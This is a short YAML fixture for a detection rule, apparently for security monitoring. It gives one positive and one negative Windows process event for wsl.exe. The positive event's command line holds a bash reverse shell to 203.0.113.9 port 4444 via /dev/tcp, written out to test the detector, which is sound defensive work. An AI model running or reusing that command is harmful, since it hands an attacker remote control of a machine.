docs:
- id: pos1
  match: true
  doc:
    host:
      os: {type: windows}
      name: win1
    user: {name: alice}
    event: {category: process, type: start}
    process:
      name: wsl.exe
      executable: 'C:\Windows\System32\wsl.exe'
      command_line: 'wsl.exe --exec bash -c "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"'
- id: neg1
  doc:
    host:
      os: {type: windows}
      name: win1
    user: {name: alice}
    event: {category: process, type: start}
    process:
      name: wsl.exe
      executable: 'C:\Windows\System32\wsl.exe'
      command_line: 'wsl.exe -l -v'
